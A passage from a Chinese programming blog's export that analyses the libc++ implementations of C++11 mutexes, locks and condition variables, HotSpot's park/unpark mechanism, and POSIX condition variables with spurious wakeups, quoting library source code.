detch, join，可以直接参考man文档： 12345678910111213141516171819pthread_yield: pthread_yield() causes the calling thread to relinquish the CPU. The thread is placed at the end of the run queue for its static priority and another thread is scheduled to run. For further details, see sched_yield(2)pthread_detach: The pthread_detach() function marks the thread identified by thread as detached. When a detached thread terminates, its resources are automatically released back to the system without the need for another thread to join with the terminated thread. Attempting to detach an already detached thread results in unspecified behavior.pthread_join: The pthread_join() function waits for the thread specified by thread to terminate. If that thread has already terminated, then pthread_join() returns immediately. The thread specified by thread must be joinable. 总结个人感觉像 join, detach这两个函数实际没多大用处。绝大部分情况下，线程创建之后，都应该detach掉。 像join这种同步机制不如换mutex等更好。 参考 http://en.cppreference.com/w/cpp/thread/notify_all_at_thread_exit http://man7.org/linux/man-pages/man3/pthread_detach.3.html http://man7.org/linux/man-pages/man3/pthread_join.3.html http://stackoverflow.com/questions/19744250/c11-what-happens-to-a-detached-thread-when-main-exits http://man7.org/linux/man-pages/man3/pthread_yield.3.html http://man7.org/linux/man-pages/man2/sched_yield.2.html http://www.ibm.com/developerworks/cn/linux/thread/posix_threadapi/part2/ man pthread_key_create]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>cpp</tag>
        <tag>cpp11</tag>
        <tag>posix</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C++11中的mutex, lock，condition variable实现分析]]></title>
    <url>%2Fcpp11-mutex-lock-condition%2F</url>
    <content type="text"><![CDATA[前言本文分析的是llvm libc++的实现：http://libcxx.llvm.org/ C++11中的各种mutex, lock对象，实际上都是对posix的mutex，condition的封装。不过里面也有很多细节值得学习。 std::mutex先来看下std::mutex： 包增了一个pthread_mutex_t __m_，很简单，每个函数该干嘛就干嘛。 123456789101112131415161718192021222324252627282930313233343536373839404142class mutex&#123; pthread_mutex_t __m_; public: mutex() _NOEXCEPT &#123;__m_ = (pthread_mutex_t)&lt;strong&gt;PTHREAD_MUTEX_INITIALIZER&lt;/strong&gt;;&#125; ~mutex();private: mutex(const mutex&amp;);// = delete; mutex&amp; operator=(const mutex&amp;);// = delete;public: void lock(); bool try_lock() _NOEXCEPT; void unlock() _NOEXCEPT; typedef pthread_mutex_t* native_handle_type; _LIBCPP_INLINE_VISIBILITY native_handle_type native_handle() &#123;return &amp;__m_;&#125;&#125;; mutex::~mutex()&#123; pthread_mutex_destroy(&amp;__m_);&#125; void mutex::lock()&#123; int ec = pthread_mutex_lock(&amp;__m_); if (ec) __throw_system_error(ec, "mutex lock failed");&#125; bool mutex::try_lock() _NOEXCEPT&#123; return pthread_mutex_trylock(&amp;__m_) == 0;&#125; void mutex::unlock() _NOEXCEPT&#123; int ec = pthread_mutex_unlock(&amp;__m_); (void)ec; assert(ec == 0);&#125; 三种锁状态：std::defer_lock, std::try_to_lock, std::adopt_lock这三个是用于标识锁在传递到一些包装类时，锁的状态： std::defer_lock，还没有获取到锁 std::try_to_lock，在包装类构造时，尝试去获取锁 std::adopt_lock，调用者已经获得了锁 这三个东东，实际上是用于偏特化的，是三个空的struct： 123456struct defer_lock_t &#123;&#125;;struct try_to_lock_t &#123;&#125;;struct adopt_lock_t &#123;&#125;;constexpr defer_lock_t defer_lock = defer_lock_t();constexpr try_to_lock_t try_to_lock = try_to_lock_t();constexpr adopt_lock_t adopt_lock = adopt_lock_t(); 在下面的代码里，就可以看到这三个东东是怎么用的了。 std::lock_guard这个类比较重要，因为我们真正使用lock的时候，大部分都是要用这个。 这个类其实很简单： 在构造函数里调用 mutext.lock()， 在释构函数里，调用了mutex.unlock() 函数。 因为C++会在函数抛出异常时，自动调用作用域内的变量的析构函数，所以使用std::lock_guard可以在异常时自动释放锁，这就是为什么要避免直接使用mutex的函数，而是要用std::lock_guard的原因了。 1234567891011121314151617template &lt;class _Mutex&gt;class lock_guard&#123;public: typedef _Mutex mutex_type;private: mutex_type&amp; __m_;public: explicit lock_guard(mutex_type&amp; __m) : __m_(__m) &#123;__m_.lock();&#125; lock_guard(mutex_type&amp; __m, adopt_lock_t) : __m_(__m) &#123;&#125; ~lock_guard() &#123;__m_.unlock();&#125;private: lock_guard(lock_guard const&amp;);// = delete; lock_guard&amp; operator=(lock_guard const&amp;);// = delete;&#125;; 注意，std::lock_guard的两个构造函数，当只传递mutex时，会在构造函数时调用mutext.lock()来获得锁。 当传递了adopt_lock_t时，说明调用者已经拿到了锁，所以不再尝试去获得锁。 std::unique_lockunique_lock实际上也是一个包装类，起名为unique可能是和std::lock函数区分用的。注意，多了一个owns_lock函数和release()函数，这两个在std::lock函数会用到。 owns_lock函数用于判断是否拥有锁； release()函数则放弃了对锁的关联，当析构时，不会去unlock锁。再看下unique_lock的实现，可以发现，上面的三种类型就是用来做偏特化用的： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475template &lt;class _Mutex&gt;class unique_lock&#123;public: typedef _Mutex mutex_type;private: mutex_type* __m_; bool __owns_; public: unique_lock() _NOEXCEPT : __m_(nullptr), __owns_(false) &#123;&#125; explicit unique_lock(mutex_type&amp; __m) : __m_(&amp;__m), __owns_(true) &#123;__m_-&gt;lock();&#125; unique_lock(mutex_type&amp; __m, defer_lock_t) _NOEXCEPT : __m_(&amp;__m), __owns_(false) &#123;&#125; unique_lock(mutex_type&amp; __m, try_to_lock_t) //偏特化 : __m_(&amp;__m), __owns_(__m.try_lock()) &#123;&#125; unique_lock(mutex_type&amp; __m, adopt_lock_t) //偏特化 : __m_(&amp;__m), __owns_(true) &#123;&#125; template &lt;class _Clock, class _Duration&gt; unique_lock(mutex_type&amp; __m, const chrono::time_point&lt;_Clock, _Duration&gt;&amp; __t) : __m_(&amp;__m), __owns_(__m.try_lock_until(__t)) &#123;&#125; template &lt;class _Rep, class _Period&gt; unique_lock(mutex_type&amp; __m, const chrono::duration&lt;_Rep, _Period&gt;&amp; __d) : __m_(&amp;__m), __owns_(__m.try_lock_for(__d)) &#123;&#125; ~unique_lock() &#123; if (__owns_) __m_-&gt;unlock(); &#125; private: unique_lock(unique_lock const&amp;); // = delete; unique_lock&amp; operator=(unique_lock const&amp;); // = delete; public: unique_lock(unique_lock&amp;&amp; __u) _NOEXCEPT : __m_(__u.__m_), __owns_(__u.__owns_) &#123;__u.__m_ = nullptr; __u.__owns_ = false;&#125; unique_lock&amp; operator=(unique_lock&amp;&amp; __u) _NOEXCEPT &#123; if (__owns_) __m_-&gt;unlock(); __m_ = __u.__m_; __owns_ = __u.__owns_; __u.__m_ = nullptr; __u.__owns_ = false; return *this; &#125; void lock(); bool try_lock(); template &lt;class _Rep, class _Period&gt; bool try_lock_for(const chrono::duration&lt;_Rep, _Period&gt;&amp; __d); template &lt;class _Clock, class _Duration&gt; bool try_lock_until(const chrono::time_point&lt;_Clock, _Duration&gt;&amp; __t); void unlock(); void swap(unique_lock&amp; __u) _NOEXCEPT &#123; _VSTD::swap(__m_, __u.__m_); _VSTD::swap(__owns_, __u.__owns_); &#125; mutex_type* release() _NOEXCEPT &#123; mutex_type* __m = __m_; __m_ = nullptr; __owns_ = false; return __m; &#125; bool owns_lock() const _NOEXCEPT &#123;return __owns_;&#125; operator bool () const _NOEXCEPT &#123;return __owns_;&#125; mutex_type* mutex() const _NOEXCEPT &#123;return __m_;&#125;&#125;; std::lock和std::try_lock函数上面的都是类对象，这两个是函数。std::lock和std::try_lock函数用于在同时使用多个锁时，防止死锁。这个实际上很重要的，因为手写代码来处理多个锁的同步问题，很容易出错。 要注意的是std::try_lock函数的返回值： 当成功时，返回-1； 当失败时，返回第几个锁没有获取成功，以0开始计数； 首先来看下只有两个锁的情况，代码虽然看起来比较简单，但里面却有大文章： 12345678910111213141516171819202122232425262728293031323334353637383940414243template &lt;class _L0, class _L1&gt;voidlock(_L0&amp; __l0, _L1&amp; __l1)&#123; while (true) &#123; &#123; unique_lock&lt;_L0&gt; __u0(__l0); if (__l1.try_lock()) //已获得锁l0，再尝试获取l1 &#123; __u0.release(); //l0和l1都已获取到，因为unique_lock在释构时会释放l0，所以要调用release()函数，不让它释放l0锁。 break; &#125; &#125;//如果同时获取l0,l1失败，这里会释放l0。 sched_yield(); //把线程放到同一优先级的调度队列的尾部，CPU切换到其它线程执行 &#123; unique_lock&lt;_L1&gt; __u1(__l1); //因为上面尝试先获取l1失败，说明有别的线程在持有l1，那么这次先尝试获取锁l1（只有前面的线程释放了，才可能获取到） if (__l0.try_lock()) &#123; __u1.release(); break; &#125; &#125; sched_yield(); &#125;&#125;template &lt;class _L0, class _L1&gt;inttry_lock(_L0&amp; __l0, _L1&amp; __l1)&#123; unique_lock&lt;_L0&gt; __u0(__l0, try_to_lock); if (__u0.owns_lock()) &#123; if (__l1.try_lock()) //注意try_lock返回值的定义，否则这里无法理解 &#123; __u0.release(); return -1; &#125; else return 1; &#125; return 0;&#125; 上面的lock函数用尝试的办法防止了死锁。 上面是两个锁的情况，那么在多个参数的情况下呢？先来看下std::try_lock函数的实现： 里面递归地调用了try_lock函数自身，如果全部锁都获取成功，则依次把所有的unique_lock都release掉。 如果有失败，则计数失败的次数，最终返回。 12345678910111213141516template &lt;class _L0, class _L1, class _L2, class... _L3&gt;inttry_lock(_L0&amp; __l0, _L1&amp; __l1, _L2&amp; __l2, _L3&amp;... __l3)&#123; int __r = 0; unique_lock&lt;_L0&gt; __u0(__l0, try_to_lock); if (__u0.owns_lock()) &#123; __r = try_lock(__l1, __l2, __l3...); if (__r == -1) __u0.release(); else ++__r; &#125; return __r;&#125; 再来看多参数的std::lock的实现： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051template &lt;class _L0, class _L1, class _L2, class ..._L3&gt;void__lock_first(int __i, _L0&amp; __l0, _L1&amp; __l1, _L2&amp; __l2, _L3&amp; ...__l3)&#123; while (true) &#123; switch (__i) //__i用来标记上一次获取参数里的第几个锁失败，从0开始计数 &#123; case 0: //第一次执行时，__i是0 &#123; unique_lock&lt;_L0&gt; __u0(__l0); __i = try_lock(__l1, __l2, __l3...); if (__i == -1) //获取到l0之后，如果尝试获取后面的锁也成功了，即全部锁都获取到了，则设置unique_lock为release，并返回 &#123; __u0.release(); return; &#125; &#125; ++__i; //因为__i表示是获取第几个锁失败，而上面的try_lock(__l1,__l2__l3,...)是从l1开始的，因此这里要+1，调整到没有获取成功的锁上，下次先从它开始获取。 sched_yield(); break; case 1: //说明上次获取l1失败，这次先获取到l1。 &#123; unique_lock&lt;_L1&gt; __u1(__l1); __i = try_lock(__l2, __l3..., __l0); //把前一次的l0放到最后。这次先获取到了l1，再尝试获取后面的锁。 if (__i == -1) &#123; __u1.release(); return; &#125; &#125; if (__i == sizeof...(_L3) + 1) //说明把l0放到最后面时，最后获取l0时失败了。那么说明现在有其它线程持有l0，那么下一次要从l0开始获取。 __i = 0; else __i += 2; //因为__i表示是获取第几个锁失败，而上面的try_lock(__l2,__l3..., __l0)是从l2开始的，因此这里要+2 sched_yield(); break; default: __lock_first(__i - 2, __l2, __l3..., __l0, __l1); //因为这里是从l2开始的，因此__i要减2。 return; &#125; &#125;&#125; template &lt;class _L0, class _L1, class _L2, class ..._L3&gt;inline _LIBCPP_INLINE_VISIBILITYvoidlock(_L0&amp; __l0, _L1&amp; __l1, _L2&amp; __l2, _L3&amp; ...__l3)&#123; __lock_first(0, __l0, __l1, __l2, __l3...);&#125; 可以看到多参数的std::lock的实现是： 先获取一个锁，然后再调用std::try_lock去获取剩下的锁，如果失败了，则下次先获取上次失败的锁。 重复上面的过程，直到成功获取到所有的锁。 上面的算法用比较巧妙的方式实现了参数的轮转。 std::timed_mutexstd::timed_mutex 是里面封装了mutex和condition，这样就两个函数可以用： try_lock_for try_lock_until 实际上是posix的mutex和condition的包装。 123456789101112131415161718192021222324252627282930313233343536373839class timed_mutex&#123; mutex __m_; condition_variable __cv_; bool __locked_;public: timed_mutex(); ~timed_mutex();private: timed_mutex(const timed_mutex&amp;); // = delete; timed_mutex&amp; operator=(const timed_mutex&amp;); // = delete;public: void lock(); bool try_lock() _NOEXCEPT; template &lt;class _Rep, class _Period&gt; _LIBCPP_INLINE_VISIBILITY bool try_lock_for(const chrono::duration&lt;_Rep, _Period&gt;&amp; __d) &#123;return try_lock_until(chrono::steady_clock::now() + __d);&#125; template &lt;class _Clock, class _Duration&gt; bool try_lock_until(const chrono::time_point&lt;_Clock, _Duration&gt;&amp; __t); void unlock() _NOEXCEPT;&#125;; template &lt;class _Clock, class _Duration&gt;booltimed_mutex::try_lock_until(const chrono::time_point&lt;_Clock, _Duration&gt;&amp; __t)&#123; using namespace chrono; unique_lock&lt;mutex&gt; __lk(__m_); bool no_timeout = _Clock::now() &lt; __t; while (no_timeout &amp;&amp; __locked_) no_timeout = __cv_.wait_until(__lk, __t) == cv_status::no_timeout; if (!__locked_) &#123; __locked_ = true; return true; &#125; return false;&#125; std::recursive_mutex和std::recursive_timed_mutex这两个实际上是std::mutex和std::timed_mutex 的recursive模式的实现，即锁得获得者可以重复多次调用lock()函数。 和posix mutex里的recursive mutex是一样的。 看下std::recursive_mutex的构造函数就知道了。 12345678910111213141516171819202122232425262728recursive_mutex::recursive_mutex()&#123; pthread_mutexattr_t attr; int ec = pthread_mutexattr_init(&amp;attr); if (ec) goto fail; ec = pthread_mutexattr_settype(&amp;attr, PTHREAD_MUTEX_RECURSIVE); if (ec) &#123; pthread_mutexattr_destroy(&amp;attr); goto fail; &#125; ec = pthread_mutex_init(&amp;__m_, &amp;attr); if (ec) &#123; pthread_mutexattr_destroy(&amp;attr); goto fail; &#125; ec = pthread_mutexattr_destroy(&amp;attr); if (ec) &#123; pthread_mutex_destroy(&amp;__m_); goto fail; &#125; return;fail: __throw_system_error(ec, "recursive_mutex constructor failed");&#125; std::cv_status这个用来表示condition等待返回的状态的，和上面的三个表示lock的状态的用途差不多。 12345enum cv_status&#123; no_timeout, timeout&#125;; std::condition_variable包装了posix condition variable。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546class condition_variable&#123; pthread_cond_t __cv_;public: condition_variable() &#123;__cv_ = (pthread_cond_t)PTHREAD_COND_INITIALIZER;&#125; ~condition_variable();private: condition_variable(const condition_variable&amp;); // = delete; condition_variable&amp; operator=(const condition_variable&amp;); // = delete;public: void notify_one() _NOEXCEPT; void notify_all() _NOEXCEPT; void wait(unique_lock&lt;mutex&gt;&amp; __lk) _NOEXCEPT; template &lt;class _Predicate&gt; void wait(unique_lock&lt;mutex&gt;&amp; __lk, _Predicate __pred); template &lt;class _Clock, class _Duration&gt; cv_status wait_until(unique_lock&lt;mutex&gt;&amp; __lk, const chrono::time_point&lt;_Clock, _Duration&gt;&amp; __t); template &lt;class _Clock, class _Duration, class _Predicate&gt; bool wait_until(unique_lock&lt;mutex&gt;&amp; __lk, const chrono::time_point&lt;_Clock, _Duration&gt;&amp; __t, _Predicate __pred); template &lt;class _Rep, class _Period&gt; cv_status wait_for(unique_lock&lt;mutex&gt;&amp; __lk, const chrono::duration&lt;_Rep, _Period&gt;&amp; __d); template &lt;class _Rep, class _Period, class _Predicate&gt; bool wait_for(unique_lock&lt;mutex&gt;&amp; __lk, const chrono::duration&lt;_Rep, _Period&gt;&amp; __d, _Predicate __pred); typedef pthread_cond_t* native_handle_type; _LIBCPP_INLINE_VISIBILITY native_handle_type native_handle() &#123;return &amp;__cv_;&#125; private: void __do_timed_wait(unique_lock&lt;mutex&gt;&amp; __lk, chrono::time_point&lt;chrono::system_clock, chrono::nanoseconds&gt;) _NOEXCEPT;&#125;; 里面的函数都是符合直觉的实现，值得注意的是：cv_status是通过判断时间而确定的，如果超时的则返回cv_status::timeout，如果没有超时，则返回cv_status::no_timeout。 condition_variable::wait_until函数可以传入一个predicate，即一个用户自定义的判断是否符合条件的函数。这个也是很常见的模板编程的方法了。 1234567891011121314151617181920212223template &lt;class _Clock, class _Duration&gt;cv_statuscondition_variable::wait_until(unique_lock&lt;mutex&gt;&amp; __lk, const chrono::time_point&lt;_Clock, _Duration&gt;&amp; __t)&#123; using namespace chrono; wait_for(__lk, __t - _Clock::now()); return _Clock::now() &lt; __t ? cv_status::no_timeout : cv_status::timeout;&#125; template &lt;class _Clock, class _Duration, class _Predicate&gt;boolcondition_variable::wait_until(unique_lock&lt;mutex&gt;&amp; __lk, const chrono::time_point&lt;_Clock, _Duration&gt;&amp; __t, _Predicate __pred)&#123; while (!__pred()) &#123; if (wait_until(__lk, __t) == cv_status::timeout) return __pred(); &#125; return true;&#125; std::condition_variable_anystd::condition_variable_any的接口和std::condition_variable一样，不同的是 std::condition_variable只能使用std::unique_lock&lt;std::mutex&gt;，而std::condition_variable_any可以使用任何的锁对象。 下面来看下为什么std::condition_variable_any可以使用任意的锁对象。 12345678910111213141516171819202122232425262728293031323334353637class _LIBCPP_TYPE_VIS condition_variable_any&#123; condition_variable __cv_; shared_ptr&lt;mutex&gt; __mut_;public: condition_variable_any(); void notify_one() _NOEXCEPT; void notify_all() _NOEXCEPT; template &lt;class _Lock&gt; void wait(_Lock&amp; __lock); template &lt;class _Lock, class _Predicate&gt; void wait(_Lock&amp; __lock, _Predicate __pred); template &lt;class _Lock, class _Clock, class _Duration&gt; cv_status wait_until(_Lock&amp; __lock, const chrono::time_point&lt;_Clock, _Duration&gt;&amp; __t); template &lt;class _Lock, class _Clock, class _Duration, class _Predicate&gt; bool wait_until(_Lock&amp; __lock, const chrono::time_point&lt;_Clock, _Duration&gt;&amp; __t, _Predicate __pred); template &lt;class _Lock, class _Rep, class _Period&gt; cv_status wait_for(_Lock&amp; __lock, const chrono::duration&lt;_Rep, _Period&gt;&amp; __d); template &lt;class _Lock, class _Rep, class _Period, class _Predicate&gt; bool wait_for(_Lock&amp; __lock, const chrono::duration&lt;_Rep, _Period&gt;&amp; __d, _Predicate __pred);&#125;; 可以看到，在std::condition_variable_any里，用shared_ptr&lt;mutex&gt; __mut_来包装了mutex。所以一切都明白了，回顾std::unique_lock&lt;std::mutex&gt;，它包装了mutex，当析构时自动释放mutex。在std::condition_variable_any里，这份工作让shared_ptr&lt;mutex&gt;来做了。 因此，也可以很轻松得出std::condition_variable_any会比std::condition_variable稍慢的结论了。 其它的东东sched_yield()函数的man手册： sched_yield() causes the calling thread to relinquish the CPU. The thread is moved to the end of the queue for its static priority and a new thread gets to run. 在C++14里还有std::shared_lock和std::shared_timed_mutex，但是libc++里还没有对应的实现，因此不做分析。 总结llvm libc++中的各种mutex, lock, condition variable实际上是封闭了posix里的对应实现。封装的技巧和一些细节值得细细推敲学习。 看完了实现源码之后，对于如何使用就更加清晰了。 参考 http://en.cppreference.com/w/cpp http://libcxx.llvm.org/]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>cpp</tag>
        <tag>cpp11</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java的LockSupport.park()实现分析]]></title>
    <url>%2Fjava-park%2F</url>
    <content type="text"><![CDATA[LockSupportLockSupport类是Java6(JSR166-JUC)引入的一个类，提供了基本的线程同步原语。LockSupport实际上是调用了Unsafe类里的函数，归结到Unsafe里，只有两个函数： 12public native void unpark(Thread jthread);public native void park(boolean isAbsolute, long time); isAbsolute参数是指明时间是绝对的，还是相对的。 仅仅两个简单的接口，就为上层提供了强大的同步原语。 先来解析下两个函数是做什么的。 unpark函数为线程提供“许可(permit)”，线程调用park函数则等待“许可”。这个有点像信号量，但是这个“许可”是不能叠加的，“许可”是一次性的。 比如线程B连续调用了三次unpark函数，当线程A调用park函数就使用掉这个“许可”，如果线程A再次调用park，则进入等待状态。 注意，unpark函数可以先于park调用。比如线程B调用unpark函数，给线程A发了一个“许可”，那么当线程A调用park时，它发现已经有“许可”了，那么它会马上再继续运行。 实际上，park函数即使没有“许可”，有时也会无理由地返回，这点等下再解析。 park和unpark的灵活之处上面已经提到，unpark函数可以先于park调用，这个正是它们的灵活之处。 一个线程它有可能在别的线程unPark之前，或者之后，或者同时调用了park，那么因为park的特性，它可以不用担心自己的park的时序问题，否则，如果park必须要在unpark之前，那么给编程带来很大的麻烦！！ 考虑一下，两个线程同步，要如何处理？ 在Java5里是用wait/notify/notifyAll来同步的。wait/notify机制有个很蛋疼的地方是，比如 线程B要用notify通知线程A，那么线程B要确保线程A已经在wait调用上等待了，否则线程A可能永远都在等待。 编程的时候就会很蛋疼。 另外，是调用notify，还是notifyAll？ notify只会唤醒一个线程，如果错误地有两个线程在同一个对象上wait等待，那么又悲剧了。为了安全起见，貌似只能调用notifyAll了。 park/unpark模型真正解耦了线程之间的同步，线程之间不再需要一个Object或者其它变量来存储状态，不再需要关心对方的状态。 HotSpot里park/unpark的实现每个java线程都有一个Parker实例，Parker类是这样定义的： 123456789101112131415class Parker : public os::PlatformParker &#123;private: volatile int _counter ; ...public: void park(bool isAbsolute, jlong time); void unpark(); ...&#125;class PlatformParker : public CHeapObj&lt;mtInternal&gt; &#123; protected: pthread_mutex_t _mutex [1] ; pthread_cond_t _cond [1] ; ...&#125; 可以看到Parker类实际上用Posix的mutex，condition来实现的。在Parker类里的_counter字段，就是用来记录所谓的“许可”的。 当调用park时，先尝试直接能否直接拿到“许可”，即_counter&gt;0时，如果成功，则把_counter设置为0,并返回： 12345678910void Parker::park(bool isAbsolute, jlong time) &#123; // Ideally we'd do something useful while spinning, such // as calling unpackTime(). // Optional fast-path check: // Return immediately if a permit is available. // We depend on Atomic::xchg() having full barrier semantics // since we are doing a lock-free update to _counter. if (Atomic::xchg(0, &amp;_counter) &gt; 0) return; 如果不成功，则构造一个ThreadBlockInVM，然后检查_counter是不是&gt;0，如果是，则把_counter设置为0，unlock mutex并返回： 1234ThreadBlockInVM tbivm(jt);if (_counter &gt; 0) &#123; // no wait needed _counter = 0; status = pthread_mutex_unlock(_mutex); 否则，再判断等待的时间，然后再调用pthread_cond_wait函数等待，如果等待返回，则把_counter设置为0，unlock mutex并返回： 1234567if (time == 0) &#123; status = pthread_cond_wait (_cond, _mutex) ;&#125;_counter = 0 ;status = pthread_mutex_unlock(_mutex) ;assert_status(status == 0, status, "invariant") ;OrderAccess::fence(); 当unpark时，则简单多了，直接设置_counter为1，再unlock mutext返回。如果_counter之前的值是0，则还要调用pthread_cond_signal唤醒在park中等待的线程： 1234567891011121314151617181920212223void Parker::unpark() &#123; int s, status ; status = pthread_mutex_lock(_mutex); assert (status == 0, "invariant") ; s = _counter; _counter = 1; if (s &lt; 1) &#123; if (WorkAroundNPTLTimedWaitHang) &#123; status = pthread_cond_signal (_cond) ; assert (status == 0, "invariant") ; status = pthread_mutex_unlock(_mutex); assert (status == 0, "invariant") ; &#125; else &#123; status = pthread_mutex_unlock(_mutex); assert (status == 0, "invariant") ; status = pthread_cond_signal (_cond) ; assert (status == 0, "invariant") ; &#125; &#125; else &#123; pthread_mutex_unlock(_mutex); assert (status == 0, "invariant") ; &#125;&#125; 简而言之，是用mutex和condition保护了一个_counter的变量，当park时，这个变量置为了0，当unpark时，这个变量置为1。 值得注意的是在park函数里，调用pthread_cond_wait时，并没有用while来判断，所以posix condition里的”Spurious wakeup”一样会传递到上层Java的代码里。 关于”Spurious wakeup”，参考上一篇blog：http://blog.csdn.net/hengyunabc/article/details/27969613 123if (time == 0) &#123; status = pthread_cond_wait (_cond, _mutex) ;&#125; 这也就是为什么Java dos里提到，当下面三种情况下park函数会返回： Some other thread invokes unpark with the current thread as the target; or Some other thread interrupts the current thread; or The call spuriously (that is, for no reason) returns. 相关的实现代码在： http://hg.openjdk.java.net/jdk7/jdk7/hotspot/file/81d815b05abb/src/share/vm/runtime/park.hpp http://hg.openjdk.java.net/jdk7/jdk7/hotspot/file/81d815b05abb/src/share/vm/runtime/park.cpp http://hg.openjdk.java.net/jdk7/jdk7/hotspot/file/81d815b05abb/src/os/linux/vm/os_linux.hpp http://hg.openjdk.java.net/jdk7/jdk7/hotspot/file/81d815b05abb/src/os/linux/vm/os_linux.cpp 其它的一些东东Parker类在分配内存时，使用了一个技巧，重载了new函数来实现了cache line对齐。 12345// We use placement-new to force ParkEvent instances to be// aligned on 256-byte address boundaries. This ensures that the least// significant byte of a ParkEvent address is always 0. void * operator new (size_t sz) ; Parker里使用了一个无锁的队列在分配释放Parker实例： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879volatile int Parker::ListLock = 0 ;Parker * volatile Parker::FreeList = NULL ; Parker * Parker::Allocate (JavaThread * t) &#123; guarantee (t != NULL, "invariant") ; Parker * p ; // Start by trying to recycle an existing but unassociated // Parker from the global free list. for (;;) &#123; p = FreeList ; if (p == NULL) break ; // 1: Detach // Tantamount to p = Swap (&amp;FreeList, NULL) if (Atomic::cmpxchg_ptr (NULL, &amp;FreeList, p) != p) &#123; continue ; &#125; // We've detached the list. The list in-hand is now // local to this thread. This thread can operate on the // list without risk of interference from other threads. // 2: Extract -- pop the 1st element from the list. Parker * List = p-&gt;FreeNext ; if (List == NULL) break ; for (;;) &#123; // 3: Try to reattach the residual list guarantee (List != NULL, "invariant") ; Parker * Arv = (Parker *) Atomic::cmpxchg_ptr (List, &amp;FreeList, NULL) ; if (Arv == NULL) break ; // New nodes arrived. Try to detach the recent arrivals. if (Atomic::cmpxchg_ptr (NULL, &amp;FreeList, Arv) != Arv) &#123; continue ; &#125; guarantee (Arv != NULL, "invariant") ; // 4: Merge Arv into List Parker * Tail = List ; while (Tail-&gt;FreeNext != NULL) Tail = Tail-&gt;FreeNext ; Tail-&gt;FreeNext = Arv ; &#125; break ; &#125; if (p != NULL) &#123; guarantee (p-&gt;AssociatedWith == NULL, "invariant") ; &#125; else &#123; // Do this the hard way -- materialize a new Parker.. // In rare cases an allocating thread might detach // a long list -- installing null into FreeList --and // then stall. Another thread calling Allocate() would see // FreeList == null and then invoke the ctor. In this case we // end up with more Parkers in circulation than we need, but // the race is rare and the outcome is benign. // Ideally, the # of extant Parkers is equal to the // maximum # of threads that existed at any one time. // Because of the race mentioned above, segments of the // freelist can be transiently inaccessible. At worst // we may end up with the # of Parkers in circulation // slightly above the ideal. p = new Parker() ; &#125; p-&gt;AssociatedWith = t ; // Associate p with t p-&gt;FreeNext = NULL ; return p ;&#125; void Parker::Release (Parker * p) &#123; if (p == NULL) return ; guarantee (p-&gt;AssociatedWith != NULL, "invariant") ; guarantee (p-&gt;FreeNext == NULL , "invariant") ; p-&gt;AssociatedWith = NULL ; for (;;) &#123; // Push p onto FreeList Parker * List = FreeList ; p-&gt;FreeNext = List ; if (Atomic::cmpxchg_ptr (p, &amp;FreeList, List) == List) break ; &#125;&#125; 总结与扯谈JUC(Java Util Concurrency)仅用简单的park, unpark和CAS指令就实现了各种高级同步数据结构，而且效率很高，令人惊叹。 在C++程序员各种自制轮子的时候，Java程序员则有很丰富的并发数据结构，如lock，latch，queue，map等信手拈来。 要知道像C++直到C++11才有标准的线程库，同步原语，但离高级的并发数据结构还有很远。boost库有提供一些线程，同步相关的类，但也是很简单的。Intel的tbb有一些高级的并发数据结构，但是国内boost都用得少，更别说tbb了。 最开始研究无锁算法的是C/C++程序员，但是后来很多Java程序员，或者类库开始自制各种高级的并发数据结构，经常可以看到有分析Java并发包的文章。反而C/C++程序员总是在分析无锁的队列算法。高级的并发数据结构，比如并发的HashMap，没有看到有相关的实现或者分析的文章。在C++11之后，这种情况才有好转。 因为正确高效实现一个Concurrent Hash Map是很困难的，要对内存CPU有深刻的认识，而且还要面对CPU不断升级带来的各种坑。 我认为真正值得信赖的C++并发库，只有Intel的tbb和微软的PPL。 https://software.intel.com/en-us/node/506042 Intel® Threading Building Blocks http://msdn.microsoft.com/en-us/library/dd492418.aspx Parallel Patterns Library (PPL) 另外FaceBook也开源了一个C++的类库，里面也有并发数据结构。 https://github.com/facebook/folly]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>cpp</tag>
        <tag>jvm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[并行编程之条件变量（posix condition variables）]]></title>
    <url>%2Fposix-condition-variables%2F</url>
    <content type="text"><![CDATA[前言在整理Java LockSupport.park()的东东，看到了个”Spurious wakeup”，重新梳理下。 首先来个《UNIX环境高级编程》里的例子： 123456789101112131415161718192021222324252627#include &lt;pthread.h&gt;struct msg &#123; struct msg *m_next; /* ... more stuff here ... */&#125;;struct msg *workq;pthread_cond_t qready = PTHREAD_COND_INITIALIZER;pthread_mutex_t qlock = PTHREAD_MUTEX_INITIALIZER;void process_msg(void) &#123; struct msg *mp; for (;;) &#123; pthread_mutex_lock(&amp;qlock); while (workq == NULL) pthread_cond_wait(&amp;qready, &amp;qlock); mp = workq; workq = mp-&gt;m_next; pthread_mutex_unlock(&amp;qlock); /* now process the message mp */ &#125;&#125;void enqueue_msg(struct msg *mp) &#123; pthread_mutex_lock(&amp;qlock); mp-&gt;m_next = workq; workq = mp; pthread_mutex_unlock(&amp;qlock); pthread_cond_signal(&amp;qready);&#125; 一个简单的消息生产者和消费者的代码。它们之间用condition同步。这个代码最容易让人搞混的是process_msg函数里的pthread_mutex_lock 和 pthread_mutex_unlock 是一对函数调用，前面加锁，后面解锁。的确，是加锁解锁，但是它们两不是一对的。它们的另一半在pthread_cond_wait函数里。 pthread_cond_wait函数可以认为它做了三件事： 把自身线程放到condition的等待队列里，把mutex解锁； 等待被唤醒（当其它线程调用pthread_cond_signal或者pthread_cond_broadcast时）； 被唤醒之后，对metex加锁，再返回。 mutex和condition实际上是绑定在一起的，一个condition只能对应一个mutex。在Java的代码里，Condition对象只能通过lock.newCondition()的函数来获取。 Spurious wakeup所谓的spurious wakeup，指的是一个线程调用pthread_cond_signal()，却有可能不止一个线程被唤醒。为什么会出现这种情况？wiki和其它的一些文档都只是说在多核的情况下，简化实现允许出现这种spurious wakeup。。 在man文档里给出了一个可能的实现，然后解析为什么会出现。 